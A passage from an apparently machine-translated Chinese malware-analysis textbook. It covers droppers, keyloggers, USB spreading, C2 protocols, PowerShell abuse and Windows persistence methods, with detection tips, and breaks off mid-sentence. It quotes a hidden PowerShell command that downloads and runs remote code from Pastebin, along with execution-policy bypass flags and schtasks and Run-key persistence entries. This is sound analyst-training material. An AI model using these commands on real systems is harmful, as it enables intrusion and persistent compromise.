下面是一个64位恶意软件投放器（称为黑客之门）的例子。如果你还不熟悉调试64位样本，请参考前一章的2.7节，调试64位恶意软件。该恶意软件使用相同的API函数集来寻找和提取资源；不同的是，前几个参数被放置在寄存器中，而不是推到堆栈中（因为它是一个64位二进制文件）。恶意软件首先使用FindResourceW()API找到BIN/100资源，如下所示。\n然后，恶意软件使用LoadResource()检索与资源相关的数据的句柄，然后它使用LockResource()获得实际资源的指针。在下面的截图中，检查LockResource()API的返回值（RAX）显示了提取的资源。在这种情况下，64位恶意软件投放者从其资源部分提取DLL，随后它将DLL投放到磁盘上。\n1.3 键盘记录器 键盘记录器是一种旨在拦截和记录键盘点击的程序。攻击者在其恶意程序中使用键盘记录功能来窃取通过键盘输入的机密信息（如用户名、密码、信用卡信息等）。在本节中，我们将主要关注用户模式的软件键盘记录器。攻击者可以使用各种技术记录击键。最常见的记录击键的方法是使用记录的Windows API函数。(a) 检查键的状态（使用 (a) 检查钥匙状态（使用GetAsyncKeyState() API）和(b) 安装钩子（使用SetWindowHookEX() API）。\n1.3.1 使用GetAsyncKeyState()的键盘记录器 这种技术涉及查询键盘上每个键的状态。为了做到这一点，键盘记录器利用GetAsyncKeyState()API函数来确定按键是否被按下。从GetAsyncKeyState()的返回值，可以确定在调用该函数时，该键是向上还是向下，以及该键是否在之前调用GetAsyncKeyState()后被按下。下面是GetAsyncKeyState()API的函数原型。\nSHORT GetAsyncKeyState(int vKey)。GetAsynKeyState()接受一个整数参数vKey，指定256个可能的虚拟键代码之一。为了确定键盘上单个按键的状态。GetAsyncKeyState() API可以通过传递与所需键相关的虚拟键代码作为参数来调用。为了确定键盘上所有按键的状态，一个键盘记录器在一个循环中不断轮询GetAsyncKeyState()API（通过传递每个虚拟按键代码作为参数），以确定哪个按键被按下。\n你可以在MSDN网站（https://msdn.microsoft.com/en-us/ library/windows/desktop/dd375731(v=vs.85).aspx）上找到与虚拟键代码相关的符号常量名称。\n下面的截图显示了一个键盘记录器的代码片段。该键盘记录器通过调用地址为0x401441的GetKeyState()API来确定Shift键的状态（如果它是向上或向下）。在地址0x401459，键盘记录器调用GetAsyncKeyState()，这是一个循环的一部分，在循环的每个迭代中，虚拟键代码（从键代码数组中读取）被作为参数传递，以确定每个键的状态。在地址0x401463处，一个测试操作（与AND操作相同）被执行。 在地址0x401463，对GetAsyncKeyState()的返回值进行测试操作（与AND操作相同），以确定最重要的位是否被设置。如果最重要的位被设置了，这就表明按键被按下了。如果一个特定的键被按下，那么键盘记录器就会调用地址为0x40146c的GetKeyState()来检查Caps Lock键的状态（以检查它是否被打开）。使用这种技术，恶意软件可以确定在键盘上输入的是大写字母、小写字母、数字还是特殊字符。\n下面的截图显示了该循环的结束。从代码中可以看出，该恶意软件在0x5c（92）键代码中进行迭代。在这种情况下，var_4作为索引进入要检查的键代码数组，它在循环结束时被递增，只要var_4的值小于0x5c（92），循环就会继续。\n1.3.2 使用SetWindowsHookEx()的键盘记录器 另一种常见的键盘记录器技术是，它安装一个函数（称为钩子程序）来监测键盘事件（如按键）。在这种方法中，恶意程序注册了一个函数（钩子程序），当键盘事件被触发时，该函数将被通知，该函数可以将按键记录到一个文件或通过网络发送。恶意程序使用SetWindowsHookEx()API来指定要监控的事件类型（如键盘、鼠标等）以及当特定类型的事件发生时应该被通知的钩子程序。钩子程序可以包含在一个DLL或当前模块中。在下面的截图中，恶意软件样本通过调用SetWindowsHookEx()和WH_KEYBOARD_LL参数（恶意软件也可能使用WH_KEYBOARD）为低级别的键盘事件注册了一个钩子过程。第二个参数 第二个参数，offset hook_proc，是挂钩过程的地址。当键盘事件发生时，这个函数将被通知。检查这个函数可以了解到键盘记录器是如何和在哪里记录击键的。第三个参数是包含钩子程序的模块（如DLL或当前模块）的句柄。第四个参数，0，指定钩子程序将与同一桌面上的所有现有线程相关。\n1.4 通过可移动媒体复制恶意软件 攻击者可以通过感染可移动媒体（如USB驱动器）来传播其恶意程序。攻击者可以利用自动运行功能（或利用自动运行中的漏洞），在被感染的媒体被插入时自动感染其他系统。这种技术通常涉及复制文件或修改存储在可移动媒体上的现有文件。一旦恶意软件将恶意文件复制到可移动媒体上，它可以使用各种技巧使该文件看起来像一个合法文件，以欺骗用户在USB插入不同系统时执行该文件。感染可移动媒体的技术使攻击者能够在断开连接的网络或有空气阻隔的网络上传播他们的恶意软件。\n在下面的例子中，恶意软件调用GetLogicalDriveStringsA()来获取计算机上有效驱动器的详细信息。调用GetLogicDriveStringsA()后，可用驱动器的列表被存储在输出缓冲区RootPathName中，该缓冲区被作为第二个参数传递给GetLogicalDriveStringsA()。下面的截图显示了调用GetLogicDriveStringsA()后的三个驱动器：C:\\、D:\\和E:\\，其中E:\\是USB驱动器。一旦它确定了驱动器的列表，它就会遍历每个驱动器以确定它是否是一个可移动的驱动器。它通过比较GetDriveTypeA()的返回值和DRIVE_REMOVABLE（常量值2）来确定。\n如果检测到可移动媒体，恶意软件会使用CopyFileA()API将自己（可执行文件）复制到可移动媒体（USB驱动器）。为了隐藏可移动媒体上的文件，它调用SetFileAttributesA()API并传递给它一个常量值FILE_ATTRIBUTE_HIDDEN。\n将恶意文件复制到可移动媒体后，攻击者可以等待用户双击复制的文件，或者可以利用自动运行功能。在Windows Vista之前，恶意软件除了复制可执行文件外，还将包含Autorun命令的autorun.inf文件复制到可移动媒体上。这些自动运行命令允许攻击者在媒体被插入系统时自动启动程序（无需用户干预）。从Windows Vista开始，通过Autorun执行恶意二进制文件在默认情况下是不可能的，所以攻击者必须使用不同的技术（如修改注册表项）或利用一个漏洞，这可能允许恶意二进制文件自动执行。\n一些恶意软件程序依靠欺骗用户来执行恶意二进制文件，而不是利用自动运行功能。安朵美达就是这样一个恶意软件的例子。为了证明安朵美达使用的伎俩，请看下面的截图，它显示了将2GB的干净USB驱动器插入感染了安朵美达的系统之前的内容。USB的根目录包括一个名为test.txt的文件和一个名为testdir的文件夹。\n一旦干净的USB驱动器被插入被安朵美达感染的计算机，它就会执行以下步骤来感染USB驱动器。\n它通过调用GetLogicalDriveStrings()确定系统中所有驱动器的列表。 恶意软件迭代每个驱动器，并使用GetDriveType()API确定任何驱动器是否为可移动媒体。 一旦找到可移动媒体，它就调用CreateDirectoryW()API来创建一个文件夹（目录），并传递一个扩展ASCII码xA0（á）作为第一个参数（目录名称）。这就在可移动媒体中创建了一个名为E:á的文件夹，由于使用了扩展ASCII码，该文件夹在显示时没有名称。下面的屏幕截图显示了创建 E:\\á目录的创建。从现在开始，我将把这个由恶意软件创建的目录称为未命名的目录（文件夹）。 下面的屏幕截图显示了未命名的文件夹。这是在上一步骤中创建的具有xA0扩展ascii代码的文件夹。\n然后，它通过调用SetFileAttributesW()API，将这个未命名的文件夹的属性设置为隐藏，使其成为受保护的操作系统文件夹。这就隐藏了可移动媒体上的文件夹。 恶意软件从注册表中解密了可执行内容。然后它在未命名的文件夹中创建一个文件。创建的文件名有 惯例.1，并将PE可执行内容（恶意DLL）写入该文件（使用CreateFile（）和WriteFile（）API）。结果，在未命名的文件夹内创建了一个名字为.1的DLL，如图所示。 然后，该恶意软件在未命名的文件夹内创建一个desktop.ini文件，并写入图标信息，为未命名的文件夹分配一个自定义图标。desktop.ini的内容显示在这里。 下面的截图显示了未命名的文件夹的图标，它已被改变为驱动器图标。另外，请注意，未命名的文件夹现在是隐藏的。换句话说，这个文件夹只有在文件夹选项被配置为显示隐藏的和受保护的操作系统文件时才会显示出来。\n然后，恶意软件调用MoveFile()API，将所有的文件和文件夹（在这种情况下，test.txt和testdir）从根目录移动到未命名的隐藏文件夹。在复制了用户的文件和文件夹后，USB驱动器的根目录看起来就像这里所示。 然后，该恶意软件创建了一个指向rundll32.exe的快捷链接，而rundll32.exe的参数是.1文件（这就是之前丢在未命名文件夹中的DLL）。下面的截图显示了快捷方式文件的外观，以及显示通过rundll32.exe加载恶意DLL的方式的属性。换句话说，当快捷方式文件被双击时，恶意DLL会通过rundll32.exe加载，从而执行恶意代码。 利用上述操作，安朵美达玩了一个心理把戏。现在，让我们了解一下，当用户在一个干净的系统上插入被感染的USB驱动器时会发生什么。下面的截图显示了被感染的USB驱动器的内容，它显示给正常用户（默认的文件夹选项）。请注意，用户看不到未命名的文件夹，用户的文件/文件夹（在我们的例子中，test.txt和testdir）在根驱动器中丢失。该恶意软件正在欺骗用户，使其相信该快捷方式文件是一个驱动器。\n当用户发现USB根驱动器中的所有重要文件和文件夹丢失时，用户极有可能双击该快捷方式文件（认为它是一个驱动器）来寻找丢失的文件。由于双击该快捷方式，rundll32.exe将从未命名的隐藏文件夹（用户不可见）中加载恶意DLL并感染系统。\n1.5 恶意软件指挥与控制（C2） 恶意软件的命令和控制（也称为C\u0026C或C2）是指攻击者如何沟通和展示对受感染系统的控制。感染系统后，大多数恶意软件与攻击者控制的服务器（C2服务器）进行通信，以接受命令、下载附加组件或渗出信息。攻击者使用不同的技术和协议进行指挥和控制。传统上，互联网中继聊天（IRC）多年来一直是最常见的C2渠道，但由于IRC在组织中并不常用，所以可以很容易地检测到这种流量。今天，恶意软件用于C2通信的最常见协议是HTTP/HTTPS。使用HTTP/HTTPS允许对手绕过防火墙/基于网络的检测系统，并与合法的网络流量混合在一起。恶意软件有时可能使用P2P等协议进行C2通信。一些恶意软件还使用DNS隧道（https://securelist.com/use-of-dns-tunneling-for-cc-communications/78203/）进行C2通信。\n1.5.1 HTTP指挥和控制 在本节中，你将了解对手如何使用HTTP与恶意程序进行通信。下面是APT1集团使用的一个恶意软件样本（WEBC2-DIV后门）的例子（https://www.fireeye.com/content/dam/fireeye- www/services/pdfs/mandiant-apt1-report.pdf）。恶意的二进制文件利用了 InternetOpen()、InternetOpenUrl()和InternetReadFile()等API函数，从攻击者控制的C2服务器检索网页。它期望网页包含特殊的HTML标签；然后，后门对标签内的数据进行解密，并将其解释为一个命令。以下步骤描述了WEB2- DIV后门与C2进行通信以接收命令的方式。\n首先，恶意软件调用InternetOpenA()API来初始化与互联网的连接。第一个参数指定了恶意软件将用于HTTP通信的用户代理。这个后门通过连接受感染系统的主机名（它通过调用GetComputerName()API获得）来生成用户代理。 它通过调用GetComputerName()API获得）与一个硬编码的字符串。每当你遇到二进制文件中使用的硬编码的User-Agent字符串，它可以成为一个优秀的网络指标。 然后它调用InternetOpenUrlA()连接到一个URL。你可以通过检查第二个参数来确定它所连接的URL的名称，如下所示。 下面的截图显示了调用InternetOpenUrlA()后产生的网络流量。 调用InternetOpenUrlA()后产生的网络流量。在这个阶段，恶意软件与C2服务器进行通信以读取HTML内容。 然后它使用InternetReadFile()API调用检索网页的内容。这个函数的第二个参数指定了接收数据的缓冲区的指针。下面的截图显示了调用InternetReadFile()后检索到的HTML内容。 从检索的HTML内容中，后门寻找 HTML标签内的特定内容。执行检查div标签内的内容的代码显示在以下截图中。如果所需的内容不存在，该恶意软件不做任何事情，并继续定期检查内容。 具体地说，恶意软件希望将内容以特定格式包含在div标签中，如下面的代码所示。如果在检索的HTML内容中发现以下格式，它将提取加密字符串(KxAikuzeG:F6PXR3vFqffP:H)，该字符串包含在之间:\n\u003cdiv safe: KxAikuzeG:F6PXR3vFqffP:H balance\u003e\u003c/div\u003e 然后将提取的加密字符串作为参数传给解密函数，该函数使用自定义的加密算法对字符串进行解密。你将在第9章 “恶意软件混淆技术 “中了解更多关于恶意软件的加密技术。下面的截图显示了调用解密函数后的解密字符串。解密字符串后，后门检查解密字符串的第一个字符是否为J，如果满足这个条件，那么恶意软件就会调用sleep()API来睡眠一段特定时间。简而言之，解密字符串的第一个字符作为一个命令代码，它告诉后门执行睡眠操作。 如果被解密的字符串的第一个字符是D，那么它将检查第二个字符是否是O。 第二个字符是o，如图所示。如果满足这个条件，那么它将提取从第三个字符开始的URL，并使用UrlDownloadToFile()从该URL下载一个可执行文件。然后它使用CreateProcess()API来执行下载的文件。在这种情况下，前两个字符Do作为命令代码，告诉后门下载并执行该文件。 关于APT1 WEBC2-DIV后门的全面分析，请查看作者的Cysinfo会议演讲和视频演示（https://cysinfo.com/8th- meetup-understanding-apt1-malware-techniques-using-malware- analysis-reverse-engineering/）。\n恶意软件也可能使用API，如 InternetOpen()、InternetConnect()、HttpOpenRequest()、HttpSendRequest()和InternetReadFile()等API来进行HTTP通信。你可以在这里找到一个此类恶意软件的分析和逆向工程：https://cysinfo.com/sx-2nd-meetup-reversing- and-decrypting-thecommunications-of-apt-malware/。\n除了使用HTTP/HTTPS，攻击者还可能滥用社交网络（https:// threatpost.com/attackers-moving-social-networks-command-and control-071910/ 74225/）、Pastebin等合法网站（https://cysinfo.com/uri-terror-attack-spear- phishing-emails-targeting-indian-embassies-and-indian-mea/）和Dropbox等云存储服务（https://www.fireeye.com/blog/threat-research/2015/11/ china-based-threat.html）来进行恶意软件指挥和控制。这些技术使得监测和检测恶意通信变得困难，而且它们允许攻击者绕过基于网络的安全控制。\n1.5.2 定制指挥和控制（定制的cc） 攻击者可能使用自定义协议或通过非标准端口进行通信，以隐藏其命令和控制流量。下面是这样一个恶意软件样本的例子（HEARTBEAT RAT），其细节记录在白皮书中（http://www. trendmicro.it/media/wp/the-heartbeat-apt-campaign-whitepaper-en.pdf）。这个恶意软件使用自定义协议（非HTTP）在80端口进行加密通信，并从C2服务器上获取命令。它利用了 它利用Socket()、Connect()、Send()和Recv()API调用，与C2进行通信并接收命令。\n首先，该恶意软件调用WSAStartup()API来初始化Windows套接字系统。然后，它调用Socket()API来创建一个套接字，这在下面的截图中显示。该套接字API接受三个参数。第一个参数 第一个参数，AF_INET，指定地址族，即IPV4。第二个参数是套接字类型，（SOCK_STREAM），第三个参数是 第三个参数，IPPROTO_TCP，指定正在使用的协议（本例中为TCP）。 在建立与套接字的连接之前，恶意软件使用GetHostByName()API解析了C2域名的地址。这是有道理的，因为远程地址和端口需要提供给Connect()API来建立连接。GetHostByName()的返回值（EAX）是一个指向名为hostent的结构的指针，该结构包含解析的IP地址。 它从hostent结构中读取解析后的IP地址，并将其传递给 inet_ntoa() API，该API将IP地址转换成ASCII字符串，如192.168.1.100。然后调用inet_addr()，它将IP地址字符串（如192.168.1.100）转换为可以被Connect()API使用。然后调用Connect() API来建立与套接字的连接。 然后，恶意软件收集系统信息，使用XOR加密算法对其进行加密（加密技术将在第9章介绍），并使用Send()API调用将其发送到C2。发送（）API的第二个参数显示了将被发送到C2服务器的加密内容。 下面的截图显示了调用Send()API后捕获的加密网络流量。\n然后，恶意软件调用CreateThread()来启动一个新线程。CreateThread的第三个参数指定了线程的起始地址（起始函数），因此在调用CreateThread()后，执行开始于起始地址。在这种情况下，线程的起始地址是一个负责从C2中读取内容的函数。 使用Recv()API函数检索C2的内容。Recv()的第二个参数是一个缓冲区，其中存储了检索的内容。然后对检索到的内容进行解密，并根据从C2收到的命令，由恶意软件执行适当的行动。要了解这个恶意软件的所有功能以及它如何处理收到的数据，请参考作者的演讲和视频演示（https：//cysinfo.com/session-11-part-2-dissecting-the heartbeat-apt-rat-features/）。\n1.6 基于PowerShell的执行 为了逃避检测，恶意软件作者往往利用系统中已经存在的工具（如PowerShell），这使他们能够隐藏其恶意活动。PowerShell是一个基于.NET框架的管理引擎。这个引擎暴露了一系列被称为cmdlets的命令。该引擎被托管在一个应用程序和Windows操作系统中，该系统默认提供一个命令行界面（互动控制台）和一个GUI PowerShell ISE（集成脚本环境）。\nPowerShell不是一种编程语言，但它允许你创建包含多个命令的有用脚本。你也可以打开PowerShell提示符并执行单个命令。PowerShell通常由系统管理员用于合法目的。然而，攻击者使用PowerShell来执行他们的恶意代码的情况也在增加。攻击者使用PowerShell的主要原因是，它提供了对所有主要操作系统功能的访问，而且留下的痕迹非常少，从而使检测更加困难。下面概述了攻击者如何在恶意软件攻击中利用PowerShell。\n在大多数情况下，Powershell被用来下载其他组件。它大多是通过含有文件（如.lnk、.wsf、JavaScript、VBScript或含有恶意宏的办公文件）的电子邮件附件传递，这些文件能够直接或间接执行PowerShell脚本。一旦攻击者欺骗用户打开恶意附件，那么恶意代码就会直接或间接调用PowerShell来下载额外的组件。 它被用于横向移动，攻击者在远程计算机上执行代码，在网络内部传播 攻击者使用PowerShell直接从内存动态加载和执行代码，而不访问文件系统。这使得攻击者可以隐身，并使取证分析更加困难。 攻击者使用PowerShell来执行他们的混淆代码；这使得传统的安全工具很难发现它。 如果你是PowerShell的新手，你可以在以下链接中找到许多教程来开始使用PowerShell：https://social.technet. microsoft.com/wiki/contents/articles/4307.powershell for- 初学者.aspx\n1.6.1 PowerShell命令基础知识 在深入研究恶意软件如何使用PowerShell的细节之前，我们先了解一下如何执行PowerShell命令。你可以使用交互式PowerShell控制台执行PowerShell命令；你可以使用Windows程序搜索功能或在命令提示符中输入powershell.exe来调出它。一旦进入交互式PowerShell，你就可以输入命令来执行它。在下面的例子中，Write- Host cmdlet把信息写到了控制台。cmdlet（如Write-Host）是一个用.NET框架语言编写的编译命令，其目的是小型的，并为单一目的服务。cmdlet遵循一个标准的动词-名词命名惯例。\nPS C:\\\u003e Write-Host \"Hello world\" Hello world一个cmdlet可以接受参数。参数以破折号开始，紧接着是参数名称和一个空格，然后是参数值。在下面的例子中，Get-Process cmdlet被用来显示关于explorer进程的信息。Get-Process cmdlet接受了一个参数，其名称为Name，其值为explorer。\nPS C:\\\u003e Get-Process -Name explorer Handles NPM(K) PM(K) WS(K) VM(M) CPU(s) Id ProcessName ------- ------ ----- ----- ----- ------ -- ----------- 1613 86 36868 77380 ...35 10.00 3036 explorer另外，你也可以使用参数快捷键来减少一些输入，上述命令也可以写成。\nPS C:\\\u003e Get-Process -n explorer Handles NPM(K) PM(K) WS(K) VM(M) CPU(s) Id ProcessName ------- ------ ----- ----- ----- ----- -- ----------- 1629 87 36664 78504 ...40 10.14 3036 explorer要获得更多关于cmdlet的信息（比如关于语法和参数的细节），你可以使用Get-Help cmdlet或help命令。如果你希望获得最新的信息，你可以使用这里显示的第二条命令，在线获得帮助。\nPS C:\\\u003e Get-Help Get-Process PS C:\\\u003e help Get-Process -online在PowerShell中，变量可以用来存储数值。在下面的例子中，hello是一个前缀为$符号的变量。\nPS C:\\\u003e $hello = \"Hello World\" PS C:\\\u003e Write-Host $hello Hello World变量也可以保存PowerShell命令的结果，然后该变量可以用来代替命令，如下所示。\nPS C:\\\u003e $processes = Get-Process PS C:\\\u003e $processes | where-object {$_.ProcessName -eq 'explorer'} Handles NPM(K) PM(K) WS(K) VM(M) CPU(s) Id ProcessName ------- ------ ----- ----- ----- ------ -- ----------- 1623 87 36708 78324 ...36 10.38 3036 explorer1.6.2 PowerShell脚本与执行策略 PowerShell的功能允许你通过组合多个命令来创建脚本。PowerShell脚本的扩展名是.ps1。默认情况下，你将不被允许执行PowerShell脚本。这是由于PowerShell中默认的执行策略设置阻止了PowerShell脚本的执行。执行策略决定了执行PowerShell脚本的条件。默认情况下，执行策略被设置为 “受限”，这意味着PowerShell脚本（.ps1）不能被执行，但你仍然可以执行单个命令。例如，当Write-Host “Hello World “命令被保存为PowerShell脚本（hello.ps1）并执行时，你会得到以下信息，说明运行脚本被禁用。这是由于执行策略的设置。\nPS C:\\\u003e .\\hello.ps1 .\\hello.ps1 : File C:\\hello.ps1 cannot be loaded because running scripts is disabled on this system. For more information, see about_Execution_Policies at http://go.microsoft.com/fwlink/?LinkID=135170. At line:1 char:1 + .\\hello.ps1 + ~~~~~~~~~~~ + CategoryInfo : SecurityError: (:) [], PSSecurityException + FullyQualifiedErrorId : UnauthorizedAccess执行策略不是一个安全功能，它只是一个防止用户意外执行脚本的控制手段。要显示当前的执行策略设置，你可以使用下面的命令。\nPS C:\\\u003e Get-ExecutionPolicy Restricted你可以使用Set-ExecutionPolicy命令来改变执行策略的设置（前提是你是以管理员身份执行该命令）。在下面的例子中，执行策略被设置为Bypass，这允许脚本不受任何限制的运行。如果你遇到一个恶意的PowerShell脚本，如果你想执行它以确定它的行为，这个设置对你的分析很有用。\nPS C:\\\u003e Set-ExecutionPolicy Bypass PS C:\\\u003e .\\hello.ps1 Hello World1.6.2 分析PowerShell命令/脚本 与汇编代码相比，Powershell命令很容易理解，但在某些情况下（比如PowerShell命令被混淆了），你可能想运行PowerShell命令来了解它的工作原理。测试单个命令的最简单方法是在交互式PowerShell中执行它。如果你想执行一个包含多个命令的PowerShell脚本（.ps1），首先将执行策略设置改为Bypass或Unrestricted（如前所述），然后使用PowerShell控制台执行该脚本。记住要在一个隔离的环境中执行恶意的脚本。 在PowerShell提示符下运行脚本（.ps1）将一次性运行所有命令。如果你想控制执行，那么你可以使用PowerShell ISE（集成脚本环境）调试PowerShell脚本。你可以通过使用程序搜索功能调出PowerShell ISE，然后将PowerShell脚本加载到PowerShell ISE中，或者复制粘贴一个命令并使用其调试功能（如Step Into、Step Over、Step Out和Breakpoints），可以通过调试菜单访问。调试前，确保将执行策略设置为Bypass。\n1.6.3 攻击者是如何使用PowerShell的 在了解了基本的PowerShell和使用什么工具进行分析后，现在让我们看看攻击者是如何使用PowerShell的。由于通过PowerShell控制台或双击执行PowerShell脚本（.ps1）的限制（这将在记事本中打开，而不是执行脚本），不太可能看到对手直接向受害者发送PowerShell脚本。攻击者必须首先欺骗用户执行恶意代码；这主要是通过发送含有.lnk、.wsf、javascript或恶意宏文件等文件的电子邮件附件来实现。一旦用户被骗打开附件文件，恶意代码就可以直接调用PowerShell（powerhell.exe），或通过cmd.exe、Wscript、Cscript等间接调用。在PowerShell被调用后，可以使用各种方法绕过执行策略。例如，为了绕过执行限制策略，攻击者可以使用恶意代码调用powershell.exe，并通过Bypass执行策略标志，如下图所示。即使用户不是管理员，这种技术也会起作用，它可以覆盖默认的执行限制策略并执行脚本。\n以同样的方式，攻击者使用各种PowerShell命令行参数来绕过执行策略。下表概述了用于逃避检测和绕过本地限制的最常见的PowerShell参数。\n命令行参数 描述 ExecutionPolicy Bypass （-Exec bypass) 忽略执行策略的限制，不加警告地运行脚本 WindowStyle 隐藏 (-W Hidden) 隐藏PowerShell窗口 NoProfile (-NoP) 忽略配置文件中的命令 EncodedCommand (-Enc) 执行以Base64编码的命令 NonInteractive (-NonI) 不向用户显示交互式提示 Command (-C) 执行单个命令 File (-F) 执行指定文件中的命令 除了使用PowerShell命令行参数，攻击者还在PowerShell脚本中使用cmdlet或.NET APIs。以下是最经常使用的命令和功能。\nInvoke-Expression（IEX）: 这个cmdlet评估或执行一个指定的字符串作为一个命令。 Invoke-Command: 这个cmdlet可以在本地或远程计算机上执行PowerShell命令。 Start-Process: 这个小程序从一个给定的文件路径启动一个进程 DownloadString: 这个方法来自System.Net.WebClient（WebClient类），从一个URL中下载资源为一个字符串 DownloadFile(): 该方法来自System.Net.WebClient（WebClient类），将资源从URL下载到本地文件。 下面是作者博文（https://cysinfo.com/cyber-attack-targeting-indian-navys- submarine-warship-manufacturer/）中提到的一个攻击中使用的PowerShell下载器的例子。在这种情况下，PowerShell命令通过cmd.exe被包含在微软Excel表格中的恶意宏调用，该表格是以电子邮件附件形式发送给受害者的。 PowerShell将下载的可执行文件作为doc6.exe丢在%TEMP%目录下。然后，它为被丢弃的可执行文件添加了一个注册表项，并调用eventvwr.exe，这是一种有趣的注册表劫持技术，允许doc6.exe被eventvwr.exe以高完整性级别执行。这种技术还默默地绕过了UAC（用户账户控制）。\n以下是一个目标攻击的PowerShell命令（https://cysinfo.com/ uri-terror-attack-spear-phishing-emails-targeting-indian-embassies-and-indian-mea/）。在这种情况下，PowerShell被恶意宏调用，而不是直接下载可执行文件，而是使用DownloadString方法从Pastebin链接下载base64内容。在下载了编码的内容后，它被解码并丢到磁盘上。\npowershell -w hidden -ep bypass -nop -c \"IEX ((New-ObjectNet.WebClient).DownloadString('http://pastebin.com/raw/[removed]'))\"在下面的例子中，在调用PowerShell之前，一个恶意软件投放者首先在%Temp%目录下写了一个扩展名为.bmp的DLL（heiqh.bmp），然后通过PowerShell启动rundll32.exe来加载DLL并执行DLL的导出函数dlgProc。\nPowerShell cd $env:TEMP ;start-process rundll32.exe heiqh.bmp,dlgProc 关于恶意软件攻击中使用的不同PowerShell技术的更多信息，请参阅白皮书。在攻击中越来越多地使用PowerShell。 https://www.symantec.com/content/dam/symantec/docs/security- center/whit-papers/increased-use-of-powershell-in-attacks-16- en.pdf。攻击者利用各种混淆技术来增加分析难度。要了解攻击者如何使用PowerShell混淆技术，请观看Daniel Bohannon在Derbycon上的演讲。 Bohannon: https://www.youtube.com/watch?v=P1lkflnWb0I。\n2. 恶意软件的持久性方法 通常情况下，对手希望他们的恶意程序留在被攻击的计算机上，甚至在Windows重新启动时也是如此。这是通过各种持久性方法实现的；这种持久性允许攻击者留在被攻击的系统上，而不需要重新感染它。有许多方法可以在每次Windows启动时运行恶意代码。在本节中，你将了解对手使用的一些持久性方法。本节所涉及的一些持久性技术允许攻击者以高权限执行恶意代码（权限升级）。\n2.1 运行注册表键 对手用来在重启后生存的最常见的持久性机制之一是通过在运行注册表键上添加一个条目来实现。被添加到运行注册表键的程序在系统启动时被执行。下面是一个最常见的运行注册表键的列表。除了这里提到的那些之外，恶意软件还可以将自己添加到各种自动启动位置。了解各种自动启动位置的最好方法是使用Sysinternals的AutoRuns工具（https://docs.microsoft.com/en-us/sysinternals/ downloads/autoruns）。\nHKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run在下面的例子中，执行时，恶意软件（bas.exe）首先在Windows目录中投放一个可执行文件（LSPRN.EXE），然后在运行注册表键中添加以下条目，以便每次系统启动时恶意程序可以启动。从注册表项可以看出，恶意软件正试图使其二进制文件看起来像一个与打印机有关的应用程序。\n[RegSetValue] bas.exe:2192 \u003e HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\\Printe rSecurityLayer = C:\\Windows\\LSPRN.EXE为了检测使用这种持久性方法的恶意软件，你可以监测与已知程序无关的运行注册表键的变化。你还可以使用Sysinternal的AutoRuns工具来检查自动启动位置的可疑条目。\n2.2 预定的任务 对手使用的另一种持久性方法是安排一个任务，让他们在指定时间或在系统启动时执行他们的恶意程序。诸如schtasks和at之类的Windows工具通常被对手用来安排程序或脚本在所需的日期和时间执行。通过使用这些工具，攻击者可以在本地计算机或远程计算机上创建任务，只要用于创建任务的账户是管理员组的一部分。在下面的例子中，恶意软件（sub.exe）首先在%AllUsersProfile%中创建一个名为service.exe的文件。 在%AllUsersProfile%\\WindowsTask\\目录下创建一个名为service.exe的文件，然后调用cmd.exe，该文件又使用schtasks Windows工具来创建一个持久的计划任务。\n[CreateFile] ssub.exe:3652 \u003e %AllUsersProfile%\\WindowsTask\\service.exe [CreateProcess] ssub.exe:3652 \u003e \"%WinDir%\\System32\\cmd.exe /C schtasks /create /tn MyApp /tr %AllUsersProfile%\\WindowsTask\\service.exe /sc ONSTART /f\" [CreateProcess] cmd.exe:3632 \u003e \"schtasks /create /tn MyApp /tr %AllUsersProfile%\\WindowsTask\\service.exe /sc ONSTART /f为了检测这种类型的持久性，可以使用Sysinternals Autoruns或任务调度器工具来列出当前安排的任务。你应该考虑监控那些与合法程序无关的任务的变化。你还可以监控传递给系统工具（如cmd.exe）的命令行参数，这些工具可能被用来创建任务。任务也可能是使用管理工具创建的，如PowerShell和Windows Management Instrumentation（WMI），所以适当的日志和监控应该有助于检测这种技术。\n2.3 启动文件夹 攻击者可以通过在启动文件夹中添加其恶意二进制文件来实现持久性。当操作系统启动时，启动文件夹会被查找，驻留在该文件夹中的文件会被执行。Windows操作系统维护两种类型的启动文件夹。(a) 用户范围和(b) 系统范围，如下图所示。驻留在用户启动文件夹中的程序只对特定用户执行，而驻留在系统文件夹中的程序则在任何用户登录系统时执行。要使用全系统的启动文件夹实现持久性，需要管理员权限。\nC:\\%AppData%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup在下面的例子中，恶意软件（Backdoor.Nitol）首先在%AppData%目录中投放了一个文件。然后，它创建了一个快捷方式（.lnk），指向所投放的文件，然后将该快捷方式添加到启动文件夹中。这样，当系统启动时，被丢弃的文件会通过快捷方式（.lnk）文件执行。\n[CreateFile] bllb.exe:3364 \u003e %AppData%\\Abcdef Hijklmno Qrs\\Abcdef Hijklmno Qrs.exe [CreateFile] bllb.exe:3364 \u003e %AppData%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Abcdef Hijklmno Qrs.exe.lnk为了检测这种类型的攻击，你可以监测在启动文件夹中添加的条目和做出的更改。\n2.4 Winlogon注册表项 攻击者可以通过修改Winlogon进程使用的注册表项来实现持久性。Winlogon进程负责处理交互式用户登录和注销。一旦用户被验证，winlogon.exe进程就会启动userinit.exe，它运行登录脚本并重新建立网络连接。userinit.exe然后启动explorer.exe，它是用户的默认外壳。 winlogon.exe进程启动userinit.exe是由于以下的注册表值。这个条目指定了当用户登录时，哪些程序需要由Winlogon执行。默认情况下，这个值被设置为userinit.exe的路径（C:\\Windows\\system32\\userinit.exe）。攻击者可以改变或添加另一个包含恶意可执行文件路径的值，然后将由 winlogon.exe进程（当用户登录时）启动。\nHKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Userinit以同样的方式，userinit.exe查询以下注册表值来启动默认的用户外壳。默认情况下，这个值被设置为explorer.exe。攻击者可以改变或添加另一个包含恶意可执行程序名称的条目，然后由userinit.exe启动。\nHKLM\\SOFTWARE\\Microsoft\\Windows 